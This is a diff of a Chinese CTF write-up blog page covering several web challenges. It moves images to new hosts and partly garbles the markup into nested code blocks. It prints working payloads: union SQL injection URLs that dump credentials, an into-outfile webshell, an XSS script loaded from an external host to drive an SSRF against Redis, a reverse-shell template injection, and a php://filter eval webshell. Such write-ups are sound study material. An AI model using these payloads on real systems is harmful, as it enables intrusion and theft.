@@ -183,7 +183,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      11.2k 字
+      11.1k 字
     </span>
   
 
@@ -193,7 +193,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      170
+      169
        分钟
     </span>
   
@@ -229,77 +229,104 @@
               <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="359度防护网站"><a href="#359度防护网站" class="headerlink" title="359度防护网站"></a>359度防护网站</h2><h3 id="1-常规解"><a href="#1-常规解" class="headerlink" title="1.常规解"></a>1.常规解</h3><ol>
 <li>网站目录下有常见遗留文件robots.txt 与 index.php.bak</li>
 </ol>
-<p><img src="https://uploader.shimo.im/f/mNgWNuGsO0C5TWh2.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/PuYLdw27kJZIyfsd.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//mNgWNuGsO0C5TWh2.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/PuYLdw27kJZIyfsd__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>2.bak文件中是base64 解开后得到 important_index_its_so_long_right.php?id=1 页面</p>
-<p><img src="https://uploader.shimo.im/f/JWAC04xrBNIIo3KB.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//JWAC04xrBNIIo3KB.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>3.在上面得到的页面中直接进行联合注入得到所有数据库名，表，字段及内容</p>
-<ul>
-<li>[<a target="_blank" rel="noopener" href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA– -](<a target="_blank" rel="noopener" href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA– -)</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/s0SEDhdn9LsruJx6.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>分别查询LTLT库和h1nt库得到LTLT库中的login表，里面有pwd,usn，usn 是admin123,pwd是md5,在somd5查询得到 wllm@123</li>
-<li>[<a target="_blank" rel="noopener" href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(pwd) from login– -](<a target="_blank" rel="noopener" href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(pwd) from login– -)</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/g6R2P7KinrnVTjco.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>h1nt库中是help表，里面有hint，内容是一个页面名，访问后提示先登录，但是并没有给登录地址，所用会话也不是与 administrator.html 相同，所以这条路先暂停</li>
-<li>[<a target="_blank" rel="noopener" href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(hint) from h1nt.help– -](<a target="_blank" rel="noopener" href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(hint) from h1nt.help– -)</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/TQmhpOesRlwRsEo7.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/0mIbhjOlPnfAfpag.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>利用得到的 usn和pwd登录进入robots.txt中的 administrator.html</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/2B03P4zqzX6RnmUq.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>进去后是一个后台，翻看页面后发现无明显可利用点，查看源码发现憨憨开发注释掉的部分</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/3PY8np9P7bRDRuIR.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/6sKyTB8ZX1SLwZQF.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>访问 writeuser_00001_log.log 后得到一页的base64，丢burp解码，找到可疑页面 up_lo_ad_ad_min.php</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/UcCJEOrAEBTOtCbK.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>访问发现要登录，但是只有一条信息需要验证，F12发现有输入长度限制为5，猜测是前面log页面中的user:00001</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/2x1MFSXYHW1YtGFg.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/CH2HoV512vHbdVGk.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/FuX1MfweX6W7PDLZ.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>登录成功后发现是一个文件上传点,很多师傅在这里上传了很久都没成功，其实在现在的开发中，只要合理运用白名单，基本就能防死文件上传，这里文件上传的后端验证就是白名单，只能上传jpg,png,gif，所以理论上无法传马</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/2Lj9BdBvDenYUDMx.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>先上传一个正常图片，得到如下信息</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/e1WiP8ADMnLzlzSL.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>之前在h1nt库中拿到的 last_index_come_on_swpu_ctf.php?id=4 页面现在发现可以进去了，这个页面的登录验证就是用的密码是00001的那个页面，进去后发现可以直接sql注入</li>
-<li>getshell的常规方法中，利用sql语句的into  outfile并不算罕见，只是由于很多情况下secure_file_priv并未设置，导致无法进行这类文件读写，但是这在渗透中仍然不应该是被忘记的一种方法，没有尝试就不能凭经验否定这种方法。我们尝试写入一句话，但是考虑到目录可能没有可写权限，我们需要找到一个确定有可写权限的文件夹，很容易联想到上传页面暴漏的文件夹就有可写权限，于是构造语句写入一句话</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/mNQnyuHQPrPE5mBX.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/n0gGRcfDFyYg0Pr5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<ul>
-<li>利用木马文件进行命令执行system(‘cat /flag’);即可获得flag</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/Z54hDTIq7Hd4GG0D.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/M3gn6mgsHFGCeUFJ.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<h3 id="2-非预期"><a href="#2-非预期" class="headerlink" title="2.非预期"></a>2.非预期</h3><ul>
-<li>出题时本意是在前台页面用WAF防死SQL注入，但是由于WAF版本未及时更新，有少数师傅用load_file将文件暴力读取了,类似这种</li>
-</ul>
-<p><img src="https://uploader.shimo.im/f/Z16ge7NNThjWcN8y.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<h2 id="sqlsqlsql"><a href="#sqlsqlsql" class="headerlink" title="sqlsqlsql"></a>sqlsqlsql</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>此题参考了第三届CBCTF的sql-labs</p>
-<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>自己测试可以发现如下过滤</p>
-<p><img src="https://uploader.shimo.im/f/xeM5wxMY44vQQBES.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/iLUlosx7Xaanl1RY.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>users表字段 id name emile salary</p>
-<p>flllag表字段 id asuazttaz</p>
-<p>查看源码可以获得提示</p>
-<pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- select * from users where id = &#x27;$id&#x27;--&gt;</span></code></pre>
+<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">182.150.46.187:8802</span>/important_index_its_so_long_right.php?id=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA-- -</code></pre>
 
+<p><img src="http://cdn.jev0n.com//s0SEDhdn9LsruJx6.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
+<ul>
+<li><p>分别查询LTLT库和h1nt库得到LTLT库中的login表，里面有pwd,usn，usn 是admin123,pwd是md5,在somd5查询得到 wllm@123</p>
+</li>
+<li><pre><code>http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39; and 1=2 union select 1,2,3,group_concat(pwd) from login-- -
+<pre><code class="hljs markdown">
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//g6R2P7KinrnVTjco.png!thumbnail</span>)
+
+<span class="hljs-bullet">*</span> h1nt库中是help表，里面有hint，内容是一个页面名，访问后提示先登录，但是并没有给登录地址，所用会话也不是与 administrator.html 相同，所以这条路先暂停
+<span class="hljs-bullet">*</span> [<span class="hljs-string">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#x27; and 1=2 union select 1,2,3,group_concat(hint) from h1nt.help-- -</span>](<span class="hljs-link">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#x27; and 1=2 union select 1,2,3,group_concat(hint</span>) from h1nt.help-- -)
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//TQmhpOesRlwRsEo7.png!thumbnail</span>)
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//0mIbhjOlPnfAfpag.png!thumbnail</span>)
+
+<span class="hljs-bullet">*</span> 利用得到的 usn和pwd登录进入robots.txt中的 administrator.html
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//2B03P4zqzX6RnmUq.png!thumbnail</span>)
+
+<span class="hljs-bullet">*</span> 进去后是一个后台，翻看页面后发现无明显可利用点，查看源码发现憨憨开发注释掉的部分
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//3PY8np9P7bRDRuIR.png!thumbnail</span>)
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//6sKyTB8ZX1SLwZQF.png!thumbnail</span>)
+
+<span class="hljs-bullet">*</span> 访问 writeuser<span class="hljs-emphasis">_00001_</span>log.log 后得到一页的base64，丢burp解码，找到可疑页面 up<span class="hljs-emphasis">_lo_</span>ad<span class="hljs-emphasis">_ad_</span>min.php
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//UcCJEOrAEBTOtCbK.png!thumbnail</span>)
+
+<span class="hljs-bullet">*</span> 访问发现要登录，但是只有一条信息需要验证，F12发现有输入长度限制为5，猜测是前面log页面中的user:00001
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//2x1MFSXYHW1YtGFg.png!thumbnail</span>)
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//CH2HoV512vHbdVGk.png!thumbnail</span>)
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//FuX1MfweX6W7PDLZ.png!thumbnail</span>)
+
+<span class="hljs-bullet">*</span> 登录成功后发现是一个文件上传点,很多师傅在这里上传了很久都没成功，其实在现在的开发中，只要合理运用白名单，基本就能防死文件上传，这里文件上传的后端验证就是白名单，只能上传jpg,png,gif，所以理论上无法传马
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">https://images-cdn.shimo.im/2Lj9BdBvDenYUDMx__thumbnail.png</span>)
+
+<span class="hljs-bullet">*</span> 先上传一个正常图片，得到如下信息
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">https://images-cdn.shimo.im/e1WiP8ADMnLzlzSL__thumbnail.png</span>)
+
+<span class="hljs-bullet">*</span> 之前在h1nt库中拿到的 last<span class="hljs-emphasis">_index_</span>come<span class="hljs-emphasis">_on_</span>swpu<span class="hljs-emphasis">_ctf.php?id=4 页面现在发现可以进去了，这个页面的登录验证就是用的密码是00001的那个页面，进去后发现可以直接sql注入</span>
+<span class="hljs-emphasis">* getshell的常规方法中，利用sql语句的into  outfile并不算罕见，只是由于很多情况下secure_</span>file<span class="hljs-emphasis">_priv并未设置，导致无法进行这类文件读写，但是这在渗透中仍然不应该是被忘记的一种方法，没有尝试就不能凭经验否定这种方法。我们尝试写入一句话，但是考虑到目录可能没有可写权限，我们需要找到一个确定有可写权限的文件夹，很容易联想到上传页面暴漏的文件夹就有可写权限，于是构造语句写入一句话</span>
+<span class="hljs-emphasis"></span>
+<span class="hljs-emphasis">![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//mNQnyuHQPrPE5mBX.png!thumbnail</span>)</span>
+<span class="hljs-emphasis"></span>
+<span class="hljs-emphasis">![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//n0gGRcfDFyYg0Pr5.png!thumbnail</span>)</span>
+<span class="hljs-emphasis"></span>
+<span class="hljs-emphasis">* 利用木马文件进行命令执行system(&#x27;cat /flag&#x27;);即可获得flag</span>
+<span class="hljs-emphasis"></span>
+<span class="hljs-emphasis">![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//Z54hDTIq7Hd4GG0D.png!thumbnail</span>)</span>
+<span class="hljs-emphasis"></span>
+<span class="hljs-emphasis">![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//M3gn6mgsHFGCeUFJ.png!thumbnail</span>)</span>
+<span class="hljs-emphasis"></span>
+<span class="hljs-emphasis">### 2.非预期</span>
+<span class="hljs-emphasis"></span>
+<span class="hljs-emphasis">* 出题时本意是在前台页面用WAF防死SQL注入，但是由于WAF版本未及时更新，有少数师傅用load_</span>file将文件暴力读取了,类似这种
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//Z16ge7NNThjWcN8y.png!thumbnail</span>)
+
+<span class="hljs-section">## sqlsqlsql</span>
+
+<span class="hljs-section">### 前言</span>
+
+此题参考了第三届CBCTF的sql-labs
+
+<span class="hljs-section">### 过滤</span>
+
+自己测试可以发现如下过滤
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//xeM5wxMY44vQQBES.png!thumbnail</span>)
+
+![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//iLUlosx7Xaanl1RY.png!thumbnail</span>)
+
+<span class="hljs-section">### 解题思路</span>
+
+users表字段 id name emile salary
+
+flllag表字段 id asuazttaz
+
+查看源码可以获得提示
+
+<span class="hljs-code">```xml</span>
+<span class="hljs-code">&lt;!-- select * from users where id = &#x27;$id&#x27;--&gt;</span></code></pre>
+</code></pre>
+</li>
+</ul>
 <p>这个提示是想说明要闭合id字段的引号<br>结合页面的英文提示，很容易想到这个题是时间盲注</p>
 <h4 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h4><ol>
 <li>用异或来闭合引号</li>
@@ -324,18 +351,20 @@
 <p>用户名：<script src=[https://xxx](https://xxxxxxx).xss.ht></script>  密码随意</p>
 <p>管理员会定期刷新页面，但是由于设置了httponly，不能直接获取cookie</p>
 <p>可以看到：</p>
-<p><img src="https://uploader.shimo.im/f/8pUCSFkixan0K5tp.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/MTSoi5D81fKG94QZ.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//8pUCSFkixan0K5tp.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//MTSoi5D81fKG94QZ.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>当我们直接访问这个ssrf_for_test.php时提示“权限不足”，但我们可以借助管理员的身份来触发这个ssrf，即是通过xss+csrf发起一个ssrf请求，提示也告诉flag在redis的flag字段，我们只要抓一下这个数据包，构造出这个过程，然后去接收返回结果就行。(网上已有很多资料，ssrf打redis等等)</p>
-<p><img src="https://uploader.shimo.im/f/jmlVlGtoGbTnYZVq.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p>注册用户  &lt;script src=”<a target="_blank" rel="noopener" href="http://xxxxxxxxx/getflag.js">http://xxxxxxxxx/getflag.js</a>&gt;</script></p>
+<p><img src="http://cdn.jev0n.com//jmlVlGtoGbTnYZVq.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
+<p>注册用户 </p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;[http://xxxxxxxxx/getflag.js](http://xxxxxxxxx/getflag.js)&gt;&lt;/script&gt;</span></span></code></pre>
+
 <p>监听一哈 python3 -m http.server   9999</p>
 <p>上个厕所回来就看到flag</p>
 <h2 id="noobpy"><a href="#noobpy" class="headerlink" title="noobpy"></a><strong>noobpy</strong></h2><p>发现</p>
-<p><img src="https://uploader.shimo.im/f/auXxNzdS46ayFlp9.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//auXxNzdS46ayFlp9.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>内存在命令注入</p>
 <p>或者尝试报错也能发现。</p>
-<p><img src="https://uploader.shimo.im/f/vQbvBUnrGvKjX2Pe.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//vQbvBUnrGvKjX2Pe.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>将request的[]重载为exec实现命令执行，并且用UA头来注入</p>
 <p>反弹shell拿到flag</p>
 <p>Exp:</p>
@@ -360,63 +389,67 @@ exp(<span class="hljs-string">&quot;request.__class__.__getitem__=__builtins__.e
 
 <h2 id="原谅最光荣"><a href="#原谅最光荣" class="headerlink" title="原谅最光荣"></a>原谅最光荣</h2><p>ps: 来自真实环境，稍微增加了一点CTF特色</p>
 <p>1.打开题目链接，点开页面上的几个链接发现路由是xxx.action会以为是java，扫描或者是常识访问到robots.txt</p>
-<p><img src="https://uploader.shimo.im/f/r0kDMSbQPPgyk4nU.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//r0kDMSbQPPgyk4nU.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>可以看到是php的，题目提到包容二字以及从这几个路径可以推断该题目是伪静态+文件包含，至于是本地还是远程需要进一步验证：</p>
 <p>访问：/.%2f.%2f.%2fpricing.action，返回对应pricing.action页面，说明可以拼接路径，但是测试无法跳转，尝试包含/etc/passwd、日志、/proc/self/也无结果，这时可以尝试远程文件包含：</p>
 <p>访问：<code>/http:%2f%2fwww.baidu.com.action</code>，截图如下：</p>
-<p><img src="https://uploader.shimo.im/f/7eUYc2DS1GX4y96Z.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//7eUYc2DS1GX4y96Z.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>结果触发了规则，注意看http:/www 中间少了个斜线，然后看代码，发现对path进行了url解码，所以可以在传入路径时使用<code>http:%252f%2fwww.baidu.com</code>来绕过这个问题。</p>
 <p>继续看代码，下面对path开头的几个字符做了检测，这里被检测的字符串数组内容未知。由于php能用的伪协议就那么几种，挨个测试即可。</p>
 <p>最后发现可以用php://filter包含本地文件获得源码：</p>
 <p><a href="view-source:http://47.116.79.40:32773/php:%252f%252ffilter/convert.base64-encode/resource=contact.action">http://47.116.79.40:32773/php:%252f%252ffilter/convert.base64-encode/resource=contact.action</a></p>
-<p><img src="https://uploader.shimo.im/f/RYmhEtnwA5kudmQ8.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//RYmhEtnwA5kudmQ8.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>但是这里是无法通过这个来读取到flag的，因为前面测试可以知道该网站代码会对path添加一个文件后缀然后包含，所以这个题应该是需要获取webshell才能拿到flag。</p>
 <p>这里我们可以用resource=<a target="_blank" rel="noopener" href="http://xxx.xxx.com/xxx">http://xxx.xxx.com/xxx</a>来包含远程文档，但是测试可知无法包含外网资源，只能包含localhost（注意末尾加%23来绕过文件后缀）：</p>
 <p><a target="_blank" rel="noopener" href="http://47.116.79.40:32773/php:%252f%252ffilter%2fconvert.base64-encode%2fresource=http:%252f%252f127.0.0.1/%23.action">http://47.116.79.40:32773/php:%252f%252ffilter%2fconvert.base64-encode%2fresource=http:%252f%252f127.0.0.1/%23.action</a></p>
-<p><img src="https://uploader.shimo.im/f/NktMC069HaYgMx6t.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//NktMC069HaYgMx6t.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>（这样是没有问题的）</p>
 <p>然后在页面可以找到一个contact.action存在一个GET型表单，提交的值可以在输出中打印出来，但是值被实体化了（无法在页面显示出&lt;&gt;等符号）。</p>
-<p><img src="https://uploader.shimo.im/f/3cTaUesE82gdpcoy.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/3cTaUesE82gdpcoy__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>这里的思路是通过base64-decode来将我们传入的base64字符串解成&lt;?php的代码，从而绕过htlm实体化编码，但是convert.base64-decode这个过滤器相对base64-decode函数来说比较古怪，在字符中间遇到等号会直接报错。</p>
 <p>这里去除等号的方法可能不唯一，我选择使用简单的utf-7编码，编码规则可以自行查看wiki，大体上是字母数字和个别符号属于直接编码，也就是直接输出；而等号属于可选的直接编码字符，一般会进行base64然后成为这种：-Iwo+。最后payload为：</p>
-<p><a target="_blank" rel="noopener" href="http://47.116.79.40:32773/php%3A%252F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%2Fconvert.base64-decode%2fresource%3Dhttp:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs%252fPg%23.action?123=echo+%22%3Ch1%3Epwned!!!%3C/h1%3E%22;">http://47.116.79.40:32773/php%3A%252F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%2Fconvert.base64-decode%2fresource%3Dhttp:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs%252fPg%23.action?123=echo+%22%3Ch1%3Epwned!!!%3C/h1%3E%22;</a></p>
-<p>格式化一下：<a target="_blank" rel="noopener" href="http://47.116.79.40:32773/php://filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http://localhost/contact.action?name=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs/Pg#.action?123=echo+&quot;">http://47.116.79.40:32773/php://filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http://localhost/contact.action?name=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs/Pg#.action?123=echo+&quot;</a><h1>pwned!!!</h1>“;</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">47.116.79.40:32773</span>/php%<span class="hljs-number">3</span>A%<span class="hljs-number">252</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fconvert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span>%<span class="hljs-number">2</span>Fconvert.base<span class="hljs-number">64</span>-decode%<span class="hljs-number">2</span>fresource%<span class="hljs-number">3</span>Dhttp:%<span class="hljs-number">252</span>f/localhost/contact.action%<span class="hljs-number">3</span>fname=xxPD<span class="hljs-number">9</span>waHAgZXZhbCgkX<span class="hljs-number">0</span>dFVFsxMjNdKTs%<span class="hljs-number">252</span>fPg%<span class="hljs-number">23</span>.action?<span class="hljs-number">123</span>=echo+%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ch<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Epwned!!!%<span class="hljs-number">3</span>C/h<span class="hljs-number">1</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>;</code></pre>
+
+<p>格式化一下：</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.116</span>.<span class="hljs-number">79.40</span>:<span class="hljs-number">32773</span><span class="hljs-regexp">/php:/</span><span class="hljs-regexp">/filter/</span>convert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span><span class="hljs-regexp">/convert.base64-decode/</span>resource=http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/contact.action?name=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs/</span>Pg<span class="hljs-comment">#.action?123=echo+&quot;&lt;h1&gt;pwned!!!&lt;/h1&gt;&quot;;</span></code></pre>
+
 <p>访问结果：</p>
-<p><img src="https://uploader.shimo.im/f/wsOp6ZcyQaigYOW0.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/wsOp6ZcyQaigYOW0__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>值得注意的是，经过base64编码payload的偏移量必须为4的整数倍，因为base64解码是以4字节一组进行转换。</p>
 <p>拿到shell后，flag.txt在根目录可以看到。</p>
-<h1 id="重来"><a href="#重来" class="headerlink" title="重来"></a>重来</h1><p>访问网站，是个登陆</p>
-<p><img src="https://uploader.shimo.im/f/SyslTmLrOKUiV7qO.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<h2 id="重来"><a href="#重来" class="headerlink" title="重来"></a>重来</h2><p>访问网站，是个登陆</p>
+<p><img src="https://images-cdn.shimo.im/SyslTmLrOKUiV7qO__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>登陆处发现login.js</p>
-<p><a href="mailto:&#x74;&#x65;&#115;&#x74;&#x40;&#113;&#x71;&#46;&#x63;&#111;&#x6d;">&#x74;&#x65;&#115;&#x74;&#x40;&#113;&#x71;&#46;&#x63;&#111;&#x6d;</a> test登录</p>
-<p><img src="https://uploader.shimo.im/f/DQAKRGTWoxXXTZI5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><a href="mailto:&#x74;&#101;&#115;&#116;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#x74;&#101;&#115;&#116;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;</a> test登录</p>
+<p><img src="https://images-cdn.shimo.im/DQAKRGTWoxXXTZI5__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>更改user为admin，访问，越权成功</p>
 <p><a target="_blank" rel="noopener" href="http://192.144.157.29:8080/a.php?classname=index&param2=admin">http://xxxx.xxx.xxx.xx/a.php?classname=index&amp;param2=admin</a></p>
 <p>发现地址发生了变化并且多了一个隐藏的表单</p>
